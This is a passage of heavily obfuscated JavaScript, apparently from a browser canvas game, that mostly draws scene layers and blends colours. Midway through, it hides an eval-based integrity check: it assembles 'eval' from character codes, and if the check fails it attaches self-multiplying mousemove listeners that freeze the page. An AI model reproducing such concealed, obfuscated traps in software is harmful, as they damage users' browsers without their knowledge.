			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w2).x;
			else var ⵠᐃᐃᐃΔ = w2.r.x;
			var d2 = ⵠⲆⲆⲆ - ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - Δⵠⵠᐃ - ⵠᐃᐃᐃΔ;
			var ΔΔᐃⵠΔ = Δⵠⵠᐃ,
				ⲆᐃᐃⲆⲆ = ⵠⲆⲆΔ,
				ⲆⲆᐃⲆᐃ = d2,
				ᐃⲆⲆⵠⲆ = ᐃⵠΔᐃⲆ;
			Δⵠⵠᐃ += d2 + 2;
			var ⲆⵠⵠⵠΔ = Δⵠⵠᐃ - 2;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w3).x;
			else var ⵠᐃᐃᐃΔ = w3.r.x;
			d2 = ⵠⲆⲆⲆ - ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - Δⵠⵠᐃ - ⵠᐃᐃᐃΔ;
			if (ⲆⵠⵠⵠΔ > Δⵠⵠᐃ + d2) {
				var ΔΔⲆΔⵠ = ⵠⵠⲆⲆΔ;
				var ⲆΔⲆⲆⵠ = Δⵠⵠᐃ,
					ΔⲆΔΔⵠ = ⵠⲆⲆΔ,
					ΔⵠᐃΔΔ = d2,
					ⵠⵠⵠⵠᐃ = ᐃⵠΔᐃⲆ;
				Δⵠⵠᐃ += d2 + Ⲇᐃᐃⵠ;
				var ⵠᐃᐃⵠΔ = Δⵠⵠᐃ
			} else {
				var ΔΔⲆΔⵠ = ⲆΔⵠⲆΔ;
				Δⵠⵠᐃ = ⲆⵠⵠⵠΔ;
				var ⵠᐃᐃⵠΔ = -ⵠΔΔ
			}
			d2 = ⵠⲆⲆⲆ - ΔᐃᐃΔ.ΔΔᐃΔⲆᐃⵠ - Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ > 0 && ᐃⲆⲆⵠ.ᐃⵠⵠΔᐃⵠΔ === 1) {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ⵠᐃⵠΔ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(15, 77, 72, 252, 239, 187, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⲆΔⵠⵠᐃᐃⵠ[ⲆⲆⲆ.time];
				Δ.fillRect(ⵠⲆⲆΔ, Δⵠⵠᐃ, ᐃⵠΔᐃⲆ, d2)
			} else {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(ᐃⲆⲆⵠ.ΔΔᐃ[0], ᐃⲆⲆⵠ.ΔΔᐃ[1], ᐃⲆⲆⵠ.ΔΔᐃ[ⵠⲆⵠⲆ], ᐃⲆⲆⵠ.ᐃΔⲆ[0], ᐃⲆⲆⵠ.ᐃΔⲆ[ΔⲆᐃᐃ], ᐃⲆⲆⵠ.ᐃΔⲆ[2], ᐃΔΔⵠ)
				} else Δ.fillStyle = ᐃⲆⲆⵠ.ⵠᐃᐃⵠⲆ[ⲆⲆⲆ.time];
				Δ.fillRect(ⵠⲆⲆΔ, Δⵠⵠᐃ, ᐃⵠΔᐃⲆ, d2)
			}
		}

		function ᐃΔᐃΔΔΔΔΔΔ(ᐃⵠⲆΔ) {
			Δ.globalAlpha = ᐃⵠⲆΔ.alpha;
			ⵠᐃᐃ(Δ, ᐃⵠⲆΔ.x + ᐃᐃΔ.ⲆΔΔ.x, ᐃⵠⲆΔ.y + ᐃᐃΔ.ⲆΔΔ.y, ᐃⵠⲆΔ.r);
			ΔⲆ(Δ, Ⲇ.ᐃΔᐃⲆΔⲆᐃ[ⲆⲆⲆ.time]);
			Δ.globalAlpha = ⵠΔⵠΔ
		}

		function ΔⲆⲆⵠΔⲆⲆ(ⵠⵠⲆᐃΔ, ⵠⵠᐃᐃΔ, ⲆΔⲆΔⲆᐃᐃ, ΔⵠⲆⵠ, ᐃⲆⲆⵠ, ᐃΔⲆᐃ) {
			var w1 = ΔⵠⲆⵠ.w1;
			var w2 = ΔⵠⲆⵠ.w2;
			var w3 = ΔⵠⲆⵠ.w3;
			var ⵠⲆⲆΔ = ᐃᐃΔ.ⲆΔΔ.x + ⵠⵠⲆᐃΔ - 700;
			var ⵠⵠΔⲆΔ = Math.max(ᐃᐃΔ.ⲆΔΔ.y + ⵠⵠᐃᐃΔ, 0);
			var ΔⲆⲆᐃΔ = Math.max(-ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ - ⲆΔⲆΔⲆᐃᐃ - ᐃⲆΔⲆⵠ, 0);
			var ⵠⲆⲆⲆ = ⵠⵠΔⲆΔ;
			var ᐃᐃⵠᐃΔ = ⵠⲆᐃⲆ - ⵠⵠΔⲆΔ - ΔⲆⲆᐃΔ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w1);
			else var ᐃⵠⵠ = w1.r;
			var Δⵠⵠᐃ = ⵠⲆⲆΔ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ;
			var ⵠΔᐃᐃᐃ = Δⵠⵠᐃ,
				ΔᐃΔΔⲆ = ⵠⲆⲆⲆ,
				ΔΔⵠΔⵠ = ᐃⵠⵠ.x + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ,
				ᐃΔΔΔᐃ = ᐃᐃⵠᐃΔ;
			Δⵠⵠᐃ += ᐃⵠⵠ.x + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ - 2;
			var ⲆΔΔᐃⲆ = Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w2);
			else var ᐃⵠⵠ = w2.r;
			var d2 = ⵠⲆⲆΔ + ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - Δⵠⵠᐃ + ᐃⵠⵠ.x;
			var ⲆᐃᐃⲆⲆ = Δⵠⵠᐃ,
				ΔΔᐃⵠΔ = ⵠⲆⲆⲆ,
				ᐃⲆⲆⵠⲆ = d2,
				ⲆⲆᐃⲆᐃ = ᐃᐃⵠᐃΔ;
			Δⵠⵠᐃ += d2 - 2;
			var ⲆⵠⵠⵠΔ = Δⵠⵠᐃ - 2;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w3);
			else var ᐃⵠⵠ = w3.r;
			d2 = ⵠⲆⲆΔ + ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - Δⵠⵠᐃ + ᐃⵠⵠ.x;
			if (ⲆⵠⵠⵠΔ < Δⵠⵠᐃ + d2 - ᐃⲆᐃᐃ) {
				var ΔΔⲆΔⵠ = true;
				var ΔⲆΔΔⵠ = Δⵠⵠᐃ,
					ⲆΔⲆⲆⵠ = ⵠⲆⲆⲆ,
					ⵠⵠⵠⵠᐃ = d2,
					ΔⵠᐃΔΔ = ᐃᐃⵠᐃΔ;
				Δⵠⵠᐃ += d2 - 2;
				var ⵠᐃᐃⵠΔ = Δⵠⵠᐃ
			} else {
				var ΔΔⲆΔⵠ = false;
				Δⵠⵠᐃ = ⲆⵠⵠⵠΔ;
				var ⵠᐃᐃⵠΔ = -1
			}
			d2 = ⵠⲆⲆΔ + ΔᐃᐃΔ.ΔΔᐃΔⲆᐃⵠ - Δⵠⵠᐃ;
			if (ⲆⲆⲆ.transition) {
				var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ΔⵠⲆΔ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
				Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
			} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time];
			Δ.fillRect(ⵠΔᐃᐃᐃ, ΔᐃΔΔⲆ, ΔΔⵠΔⵠ, ᐃΔΔΔᐃ);
			if (ᐃΔⲆᐃ) {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(15, 70, 76, 42, 139, 155, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⵠⲆΔΔᐃⵠⲆ[ⲆⲆⲆ.time]
			} else {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time]
			}
			Δ.fillRect(ⲆᐃᐃⲆⲆ, ΔΔᐃⵠΔ, ᐃⲆⲆⵠⲆ, ⲆⲆᐃⲆᐃ);
			if (ΔΔⲆΔⵠ) {
				if (ᐃΔⲆᐃ) {
					if (ⲆⲆⲆ.transition) {
						var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ᐃᐃⲆΔ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
						Δ.fillStyle = ⲆΔⲆⲆⲆ(17, 94, 96, 169, 214, 211, ᐃΔΔⵠ)
					} else Δ.fillStyle = Ⲇ.ᐃⵠⵠⵠΔΔⵠ[ⲆⲆⲆ.time]
				} else {
					if (ⲆⲆⲆ.transition) {
						var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
						Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
					} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time]
				}
				Δ.fillRect(ΔⲆΔΔⵠ, ⲆΔⲆⲆⵠ, ⵠⵠⵠⵠᐃ, ΔⵠᐃΔΔ)
			}
			if (ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && ᐃΔⲆᐃ) ΔⵠⲆⵠ.ᐃⲆᐃⲆΔᐃᐃⲆΔ(ⲆⵠⵠⵠΔ, ⵠᐃᐃⵠΔ, ⲆΔΔᐃⲆ, ⵠⲆⲆΔ, -ᐃᐃΔ.ⲆΔΔ.y + ΔᐃΔΔⲆ, -ᐃᐃΔ.ⲆΔΔ.y + ΔᐃΔΔⲆ + ᐃΔΔΔᐃ)
		}

		function ⲆΔⲆⲆⲆ(ⲆΔⵠⲆΔⲆⲆ, ᐃΔᐃⲆᐃᐃⲆⲆⲆ, ᐃⲆΔⲆⵠⲆⵠΔᐃ, ⲆⵠΔΔΔⵠᐃ, ⵠⲆᐃⵠᐃⲆⵠⲆⵠ, ⲆⵠΔⲆᐃᐃΔⵠΔ, ᐃΔΔⵠ) {
			var Ⲇᐃ = "#";
			var ⲆΔᐃⲆ = Math.floor(ⲆⵠΔΔΔⵠᐃ * ᐃΔΔⵠ + ⲆΔⵠⲆΔⲆⲆ * (1 - ᐃΔΔⵠ));
			Ⲇᐃ += ⲆΔᐃⲆ < 16 ? "0" + ⲆΔᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[31]](ΔⵠΔᐃᐃ) : ⲆΔᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[31]](16);
			var ⲆΔᐃⲆ = Math.floor(ⵠⲆᐃⵠᐃⲆⵠⲆⵠ * ᐃΔΔⵠ + (ᐃⲆᐃ - ᐃΔΔⵠ) * ᐃΔᐃⲆᐃᐃⲆⲆⲆ);
			Ⲇᐃ += ⲆΔᐃⲆ < 16 ? "0" + ⲆΔᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[31]](16) : ⲆΔᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[31]](ⵠⵠΔΔᐃⵠⲆ);
			var ⲆΔᐃⲆ = Math.floor(ᐃΔΔⵠ * ⲆⵠΔⲆᐃᐃΔⵠΔ + (1 - ᐃΔΔⵠ) * ᐃⲆΔⲆⵠⲆⵠΔᐃ);
			Ⲇᐃ += 16 > ⲆΔᐃⲆ ? "0" + ⲆΔᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[31]](ᐃᐃᐃᐃⲆᐃᐃ) : ⲆΔᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[31]](16);
			return Ⲇᐃ
		}

		function ΔⲆⵠⲆᐃᐃᐃ(ⵠⵠᐃᐃΔ, ⵠⵠⲆᐃΔ, ⵠΔⲆΔⲆ, ΔⵠⲆⵠ, ᐃⲆⲆⵠ, ᐃΔⲆᐃ) {
			var w1 = ΔⵠⲆⵠ.w1;
			var w2 = ΔⵠⲆⵠ.w2;
			var w3 = ΔⵠⲆⵠ.w3;
			var ⵠⲆⲆⲆ = ᐃᐃΔ.ⲆΔΔ.y + ⵠⵠᐃᐃΔ - 700;
			var ⵠΔⵠΔⵠ = Math.max(ᐃᐃΔ.ⲆΔΔ.x + ⵠⵠⲆᐃΔ, ⲆΔⵠ);
			var ⲆⵠΔΔⲆ = Math.max(-ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ - ⵠΔⲆΔⲆ - 100, 0);
			var ⵠⲆⲆΔ = ⵠΔⵠΔⵠ;
			var ᐃⵠΔᐃⲆ = ΔΔΔᐃ - ⵠΔⵠΔⵠ - ⲆⵠΔΔⲆ;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w1).x;
			else var ⵠᐃᐃᐃΔ = w1.r.x;
			var Δⵠⵠᐃ = ⵠⲆⲆⲆ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ;
			var ⵠΔᐃᐃᐃ = ⵠⲆⲆΔ,
				ΔᐃΔΔⲆ = Δⵠⵠᐃ,
				ᐃΔΔΔᐃ = ⵠᐃᐃᐃΔ + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ,
				ΔΔⵠΔⵠ = ᐃⵠΔᐃⲆ;
			Δⵠⵠᐃ += ⵠᐃᐃᐃΔ + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ - ΔⵠⵠΔ;
			var ⲆΔΔᐃⲆ = Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w2).x;
			else var ⵠᐃᐃᐃΔ = w2.r.x;
			var d2 = ⵠⲆⲆⲆ + ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - Δⵠⵠᐃ + ⵠᐃᐃᐃΔ;
			var ΔΔᐃⵠΔ = Δⵠⵠᐃ,
				ⲆᐃᐃⲆⲆ = ⵠⲆⲆΔ,
				ⲆⲆᐃⲆᐃ = d2,
				ᐃⲆⲆⵠⲆ = ᐃⵠΔᐃⲆ;
			Δⵠⵠᐃ += d2 - 2;
			var ⲆⵠⵠⵠΔ = Δⵠⵠᐃ - Δⵠⵠⵠ;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w3).x;
			else var ⵠᐃᐃᐃΔ = w3.r.x;
			d2 = ⵠⲆⲆⲆ + ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - Δⵠⵠᐃ + ⵠᐃᐃᐃΔ;
			if (Δⵠⵠᐃ + d2 - ᐃᐃⲆⲆ > ⲆⵠⵠⵠΔ) {
				var ΔΔⲆΔⵠ = true;
				var ⲆΔⲆⲆⵠ = Δⵠⵠᐃ,
					ΔⲆΔΔⵠ = ⵠⲆⲆΔ,
					ΔⵠᐃΔΔ = d2,
					ⵠⵠⵠⵠᐃ = ᐃⵠΔᐃⲆ;
				Δⵠⵠᐃ += d2 - 2;
				var ⵠᐃᐃⵠΔ = Δⵠⵠᐃ
			} else {
				var ΔΔⲆΔⵠ = false;
				Δⵠⵠᐃ = ⲆⵠⵠⵠΔ;
				var ⵠᐃᐃⵠΔ = -ⵠΔᐃ
			}
			d2 = ⵠⲆⲆⲆ + ΔᐃᐃΔ.ΔΔᐃΔⲆᐃⵠ - Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ > ᐃⵠⲆⵠ && ᐃⲆⲆⵠ.ᐃⵠⵠΔᐃⵠΔ === 1) {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ΔᐃⲆⵠ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(15, 77, 72, 252, 239, 187, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⲆΔⵠⵠᐃᐃⵠ[ⲆⲆⲆ.time];
				Δ.fillRect(ⵠⲆⲆΔ, Δⵠⵠᐃ, ᐃⵠΔᐃⲆ, d2)
			} else {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(ᐃⲆⲆⵠ.ΔΔᐃ[0], ᐃⲆⲆⵠ.ΔΔᐃ[1], ᐃⲆⲆⵠ.ΔΔᐃ[ⵠⲆⵠⲆ], ᐃⲆⲆⵠ.ᐃΔⲆ[0], ᐃⲆⲆⵠ.ᐃΔⲆ[ⵠΔⵠΔ], ᐃⲆⲆⵠ.ᐃΔⲆ[2], ᐃΔΔⵠ)
				} else Δ.fillStyle = ᐃⲆⲆⵠ.ⵠᐃᐃⵠⲆ[ⲆⲆⲆ.time];
				Δ.fillRect(ⵠⲆⲆΔ, Δⵠⵠᐃ, ᐃⵠΔᐃⲆ, d2)
			}
		}
		const ⵠⵠⲆΔΔΔⵠ = String.fromCharCode;
		const ⲆΔΔⲆΔⲆᐃ = 101;
		const ΔⵠⲆᐃⵠⵠⵠⲆᐃ = 118;
		const ⵠⵠⵠᐃΔⵠⵠ = "ⵠⲆΔΔⲆ";
		const ᐃⵠⲆⵠΔⲆⵠ = 97;
		const ᐃⲆⵠⲆᐃⵠᐃ = 108;
		const ᐃΔΔᐃⲆΔⵠ = ⵠⵠⲆΔΔΔⵠ(ⲆΔΔⲆΔⲆᐃ);
		const ΔⵠⵠⲆⵠⲆⲆ = ⵠⵠⲆΔΔΔⵠ(ΔⵠⲆᐃⵠⵠⵠⲆᐃ);

		function ⵠⲆΔΔⲆ() {
			ⲆᐃᐃⵠⵠⲆⲆ = ⵠⲆΔΔⲆ;
			return ⵠⲆΔΔⲆ
		}
		const ΔᐃⲆⲆⲆⲆΔᐃΔ = ⵠⵠⲆΔΔΔⵠ(ᐃⵠⲆⵠΔⲆⵠ);
		const ⲆᐃⲆⵠⵠᐃⵠ = ⵠⵠⲆΔΔΔⵠ(ᐃⲆⵠⲆᐃⵠᐃ);
		const ⵠⲆᐃΔᐃΔⵠ = ᐃΔΔᐃⲆΔⵠ + ΔⵠⵠⲆⵠⲆⲆ + ΔᐃⲆⲆⲆⲆΔᐃΔ + ⲆᐃⲆⵠⵠᐃⵠ;
		const ⲆⵠᐃⲆⲆⵠⵠ = ᐃⲆᐃΔᐃⵠᐃ[ⵠⲆᐃΔᐃΔⵠ];
		const ⲆⵠᐃᐃⲆⵠΔ = ⲆⵠᐃⲆⲆⵠⵠ(ⵠⲆΔΔⲆ + "try{" + ⵠⵠⵠᐃΔⵠⵠ + "();0;}catch(ΔᐃⲆⲆⲆⲆΔᐃΔ){1;}");
		if (ⲆⵠᐃᐃⲆⵠΔ) {
			const ⵠⵠⲆΔΔΔⵠ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("mousemove", (function() {
					ⵠⵠⲆΔΔΔⵠ()
				}))
			};
			ⵠⵠⲆΔΔΔⵠ()
		}

		function ⲆⵠΔΔⲆⵠΔᐃⵠ() {
			var ΔⲆΔⲆ = ⲆⵠΔΔⵠⵠΔ;
			var ⵠⵠⲆⵠ = ⲆⲆⵠΔΔΔᐃ;
			var ⲆᐃⵠΔ = ⵠᐃᐃⲆΔᐃΔ;
			var ⲆⲆᐃΔ = ᐃᐃᐃⵠᐃᐃΔ;
			ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃⲆΔⵠⲆ, "l", 2);
			if (ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ) ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆᐃⵠΔⵠ, ⵠ[156], 5);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆΔᐃᐃⲆ, ⵠ[156], ⵠⲆᐃᐃ);
			ᐃΔΔⵠΔ(ⵠⲆⵠⵠⲆⵠⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠⲆᐃⵠⲆ, "l", 2);
			ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && (ᐃΔΔⵠΔ(ⵠⲆⵠΔⵠⲆⵠᐃΔ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆΔᐃᐃⲆ, ⵠ[156], 5), ᐃΔΔⵠΔ(ⵠⲆⵠⵠⲆⵠⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆⲆᐃΔᐃ, "l", ⲆᐃᐃⲆ));
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆᐃⲆⲆⵠ, "ma", 4);
			var ᐃⵠΔⵠⵠᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆⲆⵠᐃΔ];
			for (var ⵠᐃ = Ⲇᐃⵠⵠ; ᐃⵠΔⵠⵠᐃⵠ.length > ⵠᐃ; ⵠᐃ++) ᐃⵠΔⵠⵠᐃⵠ[ⵠᐃ].ⵠⲆΔΔΔᐃΔ();
			var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
			for (var ⵠᐃ = 0; ᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
				var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
				for (var ᐃⵠᐃⵠ = Ⲇᐃᐃᐃ; ᐃⵠᐃⵠ < ᐃⲆⲆ.ⲆΔᐃⲆⲆ.length; ᐃⵠᐃⵠ++) ᐃΔᐃΔΔΔΔΔΔ(ᐃⲆⲆ.ⲆΔᐃⲆⲆ[ᐃⵠᐃⵠ])
			}
			var ᐃΔΔᐃΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆΔⲆᐃ];
			for (var ⵠᐃ = ΔⲆⵠⲆ; ⵠᐃ < ᐃΔΔᐃΔΔⲆ.length; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ᐃΔΔᐃΔΔⲆ[ⵠᐃ], Ⲇ.ΔⲆΔⲆᐃ);
				ᐃΔΔᐃΔΔⲆ[ⵠᐃ].ᐃΔᐃⵠᐃ(ᐃΔΔᐃΔΔⲆ[ⵠᐃ].info)
			}
			var ΔⲆᐃⲆⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠΔᐃ];
			for (var ⵠᐃ = 0; ΔⲆᐃⲆⵠ.length > ⵠᐃ; ⵠᐃ++) {
				ΔⲆᐃⲆⵠ[ⵠᐃ].action == 2 && ⵠⵠᐃΔⲆⲆⵠ(ΔⲆᐃⲆⵠ[ⵠᐃ])
			}
			var ⵠᐃⲆΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔᐃΔ];
			for (var ⵠᐃ = Δⵠᐃ; ⵠᐃ < ⵠᐃⲆΔⲆ.length; ⵠᐃ++) ⵠⵠᐃΔⲆⲆⵠ(ⵠᐃⲆΔⲆ[ⵠᐃ], Ⲇ.ⵠΔᐃᐃΔᐃⵠ);
			var ⵠᐃΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⲆⵠ];
			for (var ⵠᐃ = ᐃⵠⲆ; ⵠᐃΔΔⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃΔⲆⲆⵠ(ⵠᐃΔΔⲆ[ⵠᐃ]);
			var ⲆᐃⲆᐃᐃⲆⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔⲆᐃ];
			for (var ⵠᐃ = 0; ⲆᐃⲆᐃᐃⲆⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃΔⲆⲆⵠ(ⲆᐃⲆᐃᐃⲆⲆ[ⵠᐃ]);
			var ᐃⲆᐃⲆᐃΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⵠⵠⲆ];
			for (var ⵠᐃ = ⵠⲆᐃⵠ; ⵠᐃ < ᐃⲆᐃⲆᐃΔⲆ.length; ⵠᐃ++) ⵠⵠᐃΔⲆⲆⵠ(ᐃⲆᐃⲆᐃΔⲆ[ⵠᐃ], Ⲇ.ᐃΔᐃⵠⵠᐃᐃ);
			var ΔΔⲆⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔΔⲆⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ΔΔⲆⵠ[ⵠᐃ]);
			var ᐃΔⲆⵠⲆᐃΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃΔⲆⲆ];
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃΔⲆⵠⲆᐃΔ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃΔⲆⵠⲆᐃΔ[ⵠᐃ], Ⲇ.ⵠᐃΔⲆⲆ);
			var ΔⵠⲆᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃΔ];
			for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < ΔⵠⲆᐃⵠ.length; ⵠᐃ++) ⵠⵠᐃΔⲆⲆⵠ(ΔⵠⲆᐃⵠ[ⵠᐃ]);
			var ΔⵠⲆᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃΔ];
			for (var ⵠᐃ = ΔⲆⵠⲆ; ΔⵠⲆᐃⵠ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃΔⲆⲆⵠ(ΔⵠⲆᐃⵠ[ⵠᐃ]);
			var ΔⵠⲆᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃΔ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔⵠⲆᐃⵠ.length; ⵠᐃ++) ΔⵠᐃᐃⲆΔᐃ(ΔⵠⲆᐃⵠ[ⵠᐃ]);
			var ΔⵠⵠΔⲆⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆᐃⵠ];
			for (var ⵠᐃ = ⵠⲆᐃⵠ; ΔⵠⵠΔⲆⵠᐃ.length > ⵠᐃ; ⵠᐃ++)((ΔⵠⵠΔⲆⵠᐃ[ⵠᐃ].info & 15) === Δᐃᐃⵠ || ΔⵠⵠΔⲆⵠᐃ[ⵠᐃ].info === 10) && ⵠⵠᐃⲆ(ΔⵠⵠΔⲆⵠᐃ[ⵠᐃ]);
			var ᐃΔⲆΔΔᐃⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⵠⲆ];
